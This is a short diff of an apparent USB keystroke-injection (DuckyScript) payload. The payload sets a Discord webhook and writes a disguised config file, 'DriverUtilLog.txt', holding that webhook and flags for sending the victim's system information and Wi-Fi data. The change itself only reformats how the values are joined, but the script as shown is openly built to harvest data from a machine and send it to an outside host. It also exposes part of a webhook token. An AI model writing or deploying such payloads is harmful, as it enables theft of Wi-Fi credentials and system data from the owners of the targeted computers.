@@ -14,12 +14,7 @@ STRING $webhook = "https://discord.com/api/webhooks/1267380933858820107/GS4PzsVn
 DELAY 50
 ENTER
 DELAY 50
-REM **DO NOT CHANGE THIS ONE OR THE PROGRAM WILL NOT WORK**
-STRING $seperate = ","
-DELAY 50
-ENTER
-DELAY 50
-STRING New-Item "C:\Program Files (x86)\Temp\DriverUtilLog.txt" -ItemType File -Value $webhook$seperate$sendSysInfo$seperate$sendWifiData$seperate$useSpoilers
+STRING New-Item "C:\Program Files (x86)\Temp\DriverUtilLog.txt" -ItemType File -Value $webhook","$sendSysInfo","$sendWifiData","$useSpoilers
 DELAY 100
 ENTER
 DELAY 50
